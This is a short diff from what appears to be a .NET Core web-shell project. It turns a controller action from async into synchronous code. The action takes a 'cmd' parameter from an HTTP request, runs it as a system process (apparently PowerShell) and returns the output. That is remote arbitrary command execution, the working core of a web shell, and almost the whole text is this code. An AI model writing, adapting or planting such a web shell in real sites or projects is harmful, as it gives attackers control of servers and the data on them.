@@ -21,7 +21,7 @@ namespace web_shell_dotnetcore.Controllers
         }
 
         // GET: PowerShellCMs
-        public async Task<IActionResult> Index(string cmd)
+        public IActionResult Index(string cmd)
         {
             string result = "", error = "";
             var escapedArgs = cmd.Replace("\"", "\\\"");
@@ -37,14 +37,12 @@ namespace web_shell_dotnetcore.Controllers
                     CreateNoWindow = true,
                 }
             };
-            await Task.Run(() =>
-            {
-                process.Start();
-                result = process.StandardOutput.ReadToEnd();
-                error = process.StandardError.ReadToEnd();
-                process.WaitForExit();
-                ViewBag.res = error == "" ? result : error;
-            });
+            process.Start();
+            result = process.StandardOutput.ReadToEnd();
+            error = process.StandardError.ReadToEnd();
+            process.WaitForExit();
+            ViewBag.res = error == "" ? result : error;
+            
 
             return View();
         }
